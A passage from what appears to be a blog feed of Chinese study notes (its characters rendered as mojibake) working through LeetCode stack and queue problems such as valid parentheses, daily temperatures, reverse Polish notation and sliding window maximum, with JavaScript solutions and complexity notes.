class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>: stack.push(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">if</span> (c !== stack.pop()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack.length === <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// æˆ–è€…æ”¾å…¥ map</span></span><br><span class="line"><span class="keyword">var</span> isValid = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;   </span><br><span class="line">    <span class="keyword">const</span> stack = [];</span><br><span class="line">    <span class="keyword">const</span> map = &#123;</span><br><span class="line">      <span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;)&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;]&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;&#123;&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; s.length ; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> c = s[i];</span><br><span class="line">        <span class="keyword">if</span> (map[c]) &#123;</span><br><span class="line">          stack.push(map[c])</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c !== stack.pop()) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !stack.length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åŸºæœ¬ç±»ä¼¼çš„æ€è·¯ï¼Œä½†æ˜¯åŒ¹é…åˆ°å·¦æ‹¬å·æ—¶ï¼Œ push ç›¸åº”çš„å³æ‹¬å·ï¼Œå†ç”±åé¢çš„ pop è¿”å›ç»“æœã€‚</p><h2 id="LeetCode739â€”â€”æ¯æ—¥æ¸©åº¦ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode739â€”â€”æ¯æ—¥æ¸©åº¦ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode739â€”â€”æ¯æ—¥æ¸©åº¦ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode739â€”â€”æ¯æ—¥æ¸©åº¦ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/daily-temperatures/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -1"><a href="#è‡ªå·±çš„ä»£ç -1" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> dailyTemperatures = <span class="function"><span class="keyword">function</span> (<span class="params">temperatures</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stack = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; temperatures.length; i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> flag = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">let</span> tem = temperatures[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = i+<span class="number">1</span>; j &lt; temperatures.length; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (tem &lt; temperatures[j]) &#123;</span><br><span class="line">                flag=<span class="literal">true</span></span><br><span class="line">                stack.push(j - i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!flag)&#123; stack.push(<span class="number">0</span>);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æš´åŠ›åŒé‡å¾ªç¯ï¼Œæ—¶é—´å¤æ‚åº¦å¤ªé«˜äº†ã€‚O(n^2)</p><h3 id="æ€è·¯-amp-é¢˜è§£-1"><a href="#æ€è·¯-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>é€’å‡æ ˆï¼š</p><ul><li>å¦‚æœå½“å‰å…ƒç´ æ¯”æ ˆé¡¶å¤§ï¼Œåˆ™è®©å°é¡¹é€ä¸ªå‡ºæ ˆï¼Œç›´åˆ°å½“å‰å…ƒç´ æ¯”æ ˆé¡¶å°ï¼Œåœæ­¢å‡ºæ ˆ</li><li>æ­¤æ—¶çš„æ ˆé¡¶å…ƒç´ å°±æ˜¯å½“å‰é¡¹å³è¾¹çš„ç¬¬ä¸€ä¸ªæ¯”è‡ªå·±å¤§çš„å…ƒç´ ç´¢å¼•ï¼Œè®¡ç®—è·ç¦»</li><li>å½“å‰é¡¹å…¥æ ˆ</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> dailyTemperatures = <span class="function">(<span class="params">T</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">new</span> <span class="built_in">Array</span>(T.length).fill(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">const</span> stack = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = T.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">while</span> (stack.length &amp;&amp; T[i] &gt;= T[stack[stack.length - <span class="number">1</span>]]) &#123;</span><br><span class="line">      stack.pop()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stack.length) &#123;</span><br><span class="line">      res[i] = stack[stack.length - <span class="number">1</span>] - i</span><br><span class="line">    &#125;</span><br><span class="line">    stack.push(i)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥ç”¨fillï¼ˆ0ï¼‰å¡«å……æ•°ç»„ã€‚</p><h3 id="å¤æ‚åº¦åˆ†æ"><a href="#å¤æ‚åº¦åˆ†æ" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>ä¸€æ¬¡éå†ï¼šO(n)ï¼›æ¯ä¸ªå…ƒç´ éƒ½å‡ºæ ˆå…¥æ ˆå„ä¸€æ¬¡ï¼šçº¿æ€§æ—¶é—´çš„å¤æ‚åº¦ã€‚ç»¼åˆï¼šO(n)</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(n)</li></ul><h2 id="LeetCode150â€”â€”é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode150â€”â€”é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode150â€”â€”é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode150â€”â€”é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/evaluate-reverse-polish-notation/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -2"><a href="#è‡ªå·±çš„ä»£ç -2" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> evalRPN = <span class="function"><span class="keyword">function</span>(<span class="params">tokens</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> numStack = [], signStack = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; tokens.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isNaN</span>(<span class="built_in">parseInt</span>(tokens[i]))) &#123;</span><br><span class="line">            numStack.push(tokens[i])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;         </span><br><span class="line">            signStack.push(tokens[i])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æŠŠæ•°å­—å’Œç¬¦å·æ”¾è¿›ä¸¤ä¸ªæ ˆåä¸çŸ¥é“è¯¥æ€ä¹ˆåšäº†ã€‚é‡åˆ°ç¬¦å·ï¼Œå¯èƒ½æ•°å­—æ ˆæœ‰å¤šäºä¸¤ä¸ªæ•°å­—ï¼Œå°±è¿›è¡Œæ“ä½œã€‚è‹¥å°‘äº2ä¸ªï¼Œå°±æŒ‚èµ·ï¼Œç­‰è¶…è¿‡ä¸¤ä¸ªåæ“ä½œã€‚æ€ä¹ˆå®ç°å‘¢ï¼Ÿ</p><h3 id="æ€è·¯-amp-é¢˜è§£-2"><a href="#æ€è·¯-amp-é¢˜è§£-2" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> evalRPN = <span class="function"><span class="keyword">function</span>(<span class="params">tokens</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stk = [], len = tokens.length;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> temp;</span><br><span class="line">        <span class="keyword">switch</span>(tokens[i]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;+&quot;</span>:</span><br><span class="line">                temp = stk.pop() + stk.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;-&quot;</span>:</span><br><span class="line">                <span class="comment">// åå‡ºæ ˆçš„ å‡ å…ˆå‡ºæ ˆçš„</span></span><br><span class="line">                temp = - stk.pop() + stk.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                temp = stk.pop() * stk.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;/&quot;</span>:</span><br><span class="line">                <span class="comment">// åå‡ºæ ˆçš„ é™¤ä»¥ å…ˆå‡ºæ ˆçš„</span></span><br><span class="line">                <span class="comment">// parseInt å·²ç»æ»¡è¶³åªä¿ç•™æ•´æ•°éƒ¨åˆ†çš„åŠŸèƒ½</span></span><br><span class="line">                temp = <span class="built_in">parseInt</span>(<span class="number">1</span> / stk.pop() * stk.pop());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// å…¶ä½™éƒ½æ˜¯æ•°å­—</span></span><br><span class="line">                temp = <span class="built_in">parseInt</span>(tokens[i]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stk.push(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stk[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è‡ªå·±æƒ³å¤ªå¤šäº†ï¼Œæ—¢ç„¶æ˜¯é€†æ³¢å…°è¡¨è¾¾å¼ï¼Œå°±ä¸å¯èƒ½å­˜åœ¨å…ˆä¸€ä¸ªæ•°å­—å†ä¸€ä¸ªç¬¦å·çš„æƒ…å†µã€‚è®¾ç«‹ä¸€ä¸ªæ ˆï¼Œæ¯æ¬¡å¯¹ä¸‹ä¸€ä¸ªæ•°åˆ¤æ–­ï¼Œå¾—åˆ°tempå€¼ç„¶åpushå°±è¡Œã€‚ä¸ç®—éš¾ã€‚</p><h2 id="LeetCode84â€”â€”æŸ±çŠ¶å›¾ä¸­æœ€å¤§çš„çŸ©å½¢ï¼ˆâ˜†â˜†â˜†ï¼‰"><a href="#LeetCode84â€”â€”æŸ±çŠ¶å›¾ä¸­æœ€å¤§çš„çŸ©å½¢ï¼ˆâ˜†â˜†â˜†ï¼‰" class="headerlink" title="LeetCode84â€”â€”æŸ±çŠ¶å›¾ä¸­æœ€å¤§çš„çŸ©å½¢ï¼ˆâ˜†â˜†â˜†ï¼‰"></a>LeetCode84â€”â€”æŸ±çŠ¶å›¾ä¸­æœ€å¤§çš„çŸ©å½¢ï¼ˆâ˜†â˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/largest-rectangle-in-histogram/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -3"><a href="#è‡ªå·±çš„ä»£ç -3" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>æš´åŠ›æ±‚è§£ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> largestRectangleArea = <span class="function"><span class="keyword">function</span>(<span class="params">heights</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> maxArea = <span class="number">0</span>, minHeight = <span class="built_in">Number</span>.MAX_SAFE_INTEGER;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; heights.length; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i; j &lt; heights.length; j++)&#123;</span><br><span class="line">      <span class="comment">// æ‰¾åˆ°ä¸€æ¬¡å¾ªç¯ä¸­æœ€å°é«˜åº¦çš„æŸ±å­</span></span><br><span class="line">      minHeight = <span class="built_in">Math</span>.min(minHeight, heights[j]);</span><br><span class="line">      maxArea = <span class="built_in">Math</span>.max(maxArea, minHeight * (j-i+<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> maxArea;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-1"><a href="#å¤æ‚åº¦åˆ†æ-1" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>æ—¶é—´å¤æ‚åº¦Oï¼ˆn^2ï¼‰</li><li>ç©ºé—´å¤æ‚åº¦Oï¼ˆ1ï¼‰</li></ul><h3 id="æ€è·¯1-amp-é¢˜è§£"><a href="#æ€è·¯1-amp-é¢˜è§£" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>æš´åŠ›ä¼˜åŒ–ç‰ˆï¼šï¼ˆç¡®å®šæŸ±å­åï¼Œå¯»æ‰¾å·¦å³è¾¹ç•Œï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> largestRectangleArea = <span class="function"><span class="keyword">function</span>(<span class="params">heights</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> maxArea = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> len = heights.length;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> left = i;</span><br><span class="line">    <span class="keyword">let</span> right = i;</span><br><span class="line">    <span class="comment">// æ‰¾åˆ°ç¬¬ i ä¸ªæŸ±å­çš„ left bounder</span></span><br><span class="line">    <span class="keyword">while</span> (left &gt;= <span class="number">0</span> &amp;&amp; heights[left] &gt;= heights[i]) &#123;</span><br><span class="line">      left--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ‰¾åˆ°ç¬¬ i ä¸ªæŸ±å­çš„ right bounder</span></span><br><span class="line">    <span class="keyword">while</span> (right &lt; len &amp;&amp; heights[right] &gt;= heights[i]) &#123;</span><br><span class="line">      right++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ç¡®å®š leftã€right åå°±èƒ½çŸ¥é“è¿™ä¸ªæŸ±å­å›´æˆçš„é¢ç§¯</span></span><br><span class="line">    maxArea = <span class="built_in">Math</span>.max(maxArea, (right - left - <span class="number">1</span>) * heights[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> maxArea;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-2"><a href="#å¤æ‚åº¦åˆ†æ-2" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>æ—¶é—´å¤æ‚åº¦Oï¼ˆn^2ï¼‰</li><li>ç©ºé—´å¤æ‚åº¦Oï¼ˆ1ï¼‰</li></ul><h3 id="æ€è·¯2-amp-é¢˜è§£"><a href="#æ€è·¯2-amp-é¢˜è§£" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>å•è°ƒé€’å¢æ ˆï¼š(å¾ˆç‰›é€¼çš„æ€è·¯)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> largestRectangleArea = <span class="function"><span class="keyword">function</span>(<span class="params">heights</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> maxArea = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> stack = [];</span><br><span class="line">  <span class="comment">// ç¬¬ä¸€ä¸ª 0 ä¸ºäº†è®©ç¬¬ä¸€ä¸ªæŸ±å­æœ‰å·¦è¾¹ç•Œï¼Œæœ€åä¸€ä¸ª 0 ä¸ºäº†è®©æœ€åä¸€ä¸ªæŸ±å­æœ‰å³è¾¹ç•Œ</span></span><br><span class="line">  heights = [<span class="number">0</span>, ...heights, <span class="number">0</span>]; </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; heights.length; i++) &#123;</span><br><span class="line">    <span class="comment">// æ¯”è¾ƒæ ˆé¡¶å…ƒç´ å€¼ä¸ç¬¬ i ä¸ªå…ƒç´ å€¼å¤§å°ï¼Œå¦‚æœå‰è€…å¤§äºåè€…ï¼Œåˆ™ pop å‰è€…ï¼ˆå› ä¸ºæ‰¾åˆ°å³è¾¹ç•Œäº†ï¼‰ï¼Œåè€…å…¥æ ˆå¹¶è®¡ç®—é¢ç§¯ï¼›å¦åˆ™åè€…å…¥æ ˆã€‚</span></span><br><span class="line">    <span class="keyword">while</span> (stack.length &gt; <span class="number">0</span> &amp;&amp; heights[stack[stack.length - <span class="number">1</span>]] &gt; heights[i]) &#123;</span><br><span class="line">      maxArea = <span class="built_in">Math</span>.max(maxArea, heights[stack.pop()] * (i - stack[stack.length - <span class="number">1</span>] - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// push çš„æ˜¯ä¸‹æ ‡ï¼Œé€šè¿‡ height[stack[stack.length - 1]] å¾—åˆ°å€¼</span></span><br><span class="line">    stack.push(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> maxArea;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode42â€”â€”æ¥é›¨æ°´ï¼ˆâ˜†â˜†â˜†ï¼‰"><a href="#LeetCode42â€”â€”æ¥é›¨æ°´ï¼ˆâ˜†â˜†â˜†ï¼‰" class="headerlink" title="LeetCode42â€”â€”æ¥é›¨æ°´ï¼ˆâ˜†â˜†â˜†ï¼‰"></a>LeetCode42â€”â€”æ¥é›¨æ°´ï¼ˆâ˜†â˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/trapping-rain-water/">è·³è½¬åœ°å€</a></p><p>todoï¼Œå¤ªéš¾äº†ï¼Œæ²¡çœ‹æ‡‚é¢˜è§£ã€‚ï¼ˆç±»ä¼¼ LC84 ï¼‰</p><h2 id="LeetCode239â€”â€”æ»‘åŠ¨çª—å£æœ€å¤§å€¼ï¼ˆâ˜†â˜†â˜†ï¼‰"><a href="#LeetCode239â€”â€”æ»‘åŠ¨çª—å£æœ€å¤§å€¼ï¼ˆâ˜†â˜†â˜†ï¼‰" class="headerlink" title="LeetCode239â€”â€”æ»‘åŠ¨çª—å£æœ€å¤§å€¼ï¼ˆâ˜†â˜†â˜†ï¼‰"></a>LeetCode239â€”â€”æ»‘åŠ¨çª—å£æœ€å¤§å€¼ï¼ˆâ˜†â˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/sliding-window-maximum/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -4"><a href="#è‡ªå·±çš„ä»£ç -4" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxSlidingWindow = <span class="function"><span class="keyword">function</span>(<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length - k+<span class="number">1</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> max = -<span class="built_in">Number</span>.MAX_SAFE_INTEGER;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i; j &lt; i + k; j++)&#123;</span><br><span class="line">      max = <span class="built_in">Math</span>.max(max, nums[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    res.push(max);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ²¡è¿‡ï¼ŒOï¼ˆn^2ï¼‰è¶…å‡ºæ—¶é—´é™åˆ¶ã€‚ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-1"><a href="#æ€è·¯1-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>æš´ç ´ï¼š(ä»ç„¶è¶…æ—¶ï¼Œä¸»è¦å­¦ä¹ ä¸€ä¸‹ api è°ƒç”¨)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxSlidingWindow = <span class="function"><span class="keyword">function</span> (<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> res = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= nums.length - k; i++) &#123;</span><br><span class="line">        res.push(<span class="built_in">Math</span>.max(...nums.slice(i, i + k)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-3"><a href="#å¤æ‚åº¦åˆ†æ-3" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO((N-k)*k)ï¼ŒN æ˜¯æ•°ç»„é•¿åº¦ã€‚</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚</li></ul><h3 id="æ€è·¯2-amp-é¢˜è§£-1"><a href="#æ€è·¯2-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>ç»´æŠ¤ä¸€ä¸ªåŒç«¯é˜Ÿåˆ—ï¼Œä¿è¯é˜Ÿåˆ—é¦–å…ƒç´ æ€»æ˜¯æœ€å¤§çš„ã€‚å¹¶ä¸”é˜Ÿåˆ—åªå­˜å½“å‰çª—å£æœ‰çš„å…ƒç´ ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxSlidingWindow = <span class="function"><span class="keyword">function</span>(<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> q = [] <span class="comment">// å­˜æ”¾ä¼˜å…ˆé˜Ÿåˆ—çš„å…ƒç´ ä¸‹æ ‡ï¼Œä¸ºäº†å–å€¼æ–¹ä¾¿</span></span><br><span class="line">  <span class="keyword">const</span> result = [] <span class="comment">// ç»“æœæ•°ç»„</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœé˜Ÿåˆ—ä¸ä¸ºç©ºï¼Œå½“å‰å…ƒç´ å¤§äºé˜Ÿåˆ—é‡Œçš„å…¶ä»–å…ƒç´ ï¼Œåˆ™å¼¹å‡º</span></span><br><span class="line">    <span class="keyword">while</span> (q.length &amp;&amp; nums[i] &gt;= nums[q[q.length - <span class="number">1</span>]]) &#123;</span><br><span class="line">      q.pop()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å½“å‰å…ƒç´ ä¸‹æ ‡å…¥æ ˆ</span></span><br><span class="line">    q.push(i)</span><br><span class="line">    <span class="comment">// åˆ¤æ–­å½“å‰æœ€å¤§å€¼æ˜¯å¦åœ¨çª—å£ä¸­ï¼Œè‹¥ä¸åœ¨åˆ™è®©å…¶å‡ºé˜Ÿï¼ˆæœ‰ç‚¹æ²¡æ‡‚ï¼Ÿï¼Ÿï¼‰</span></span><br><span class="line">    <span class="keyword">while</span> (q[<span class="number">0</span>] &lt;= i - k) &#123;</span><br><span class="line">      q.shift()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è¾¾åˆ°çª—å£å¤§å°æ—¶ï¼Œå°±å‘ç»“æœæ·»åŠ æ•°æ®</span></span><br><span class="line">    <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) result.push(nums[q[<span class="number">0</span>]])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;LeetCode20â€”â€”æœ‰æ•ˆçš„æ‹¬å·ï¼ˆâ˜†ï¼‰&quot;&gt;&lt;a href=&quot;#LeetCode20â€”â€”æœ‰æ•ˆçš„æ‹¬å·ï¼ˆâ˜†ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;LeetCode20â€”â€”æœ‰æ•ˆçš„æ‹¬å·ï¼ˆâ˜†ï¼‰&quot;&gt;&lt;/a&gt;LeetCode20â€”â€”æœ‰æ•ˆçš„æ‹¬å·ï¼ˆâ˜†ï¼‰&lt;/h2&gt;&lt;</summary>
      
    
    
    
    <category term="æ•°æ®ç»“æ„" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="æ ˆå’Œé˜Ÿåˆ—" scheme="http://example.com/tags/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>ã€æ•°æ®ç»“æ„ã€‘â€” â€” æ•°ç»„ã€å­—ç¬¦ä¸²å’Œé“¾è¡¨</title>
    <link href="http://example.com/2021/06/09/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E2%80%94%20%E2%80%94%20%E6%95%B0%E7%BB%84%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E9%93%BE%E8%A1%A8/"/>
    <id>http://example.com/2021/06/09/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E2%80%94%20%E2%80%94%20%E6%95%B0%E7%BB%84%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E9%93%BE%E8%A1%A8/</id>
    <published>2021-06-09T22:05:49.000Z</published>
    <updated>2021-09-08T13:04:43.970Z</updated>
    
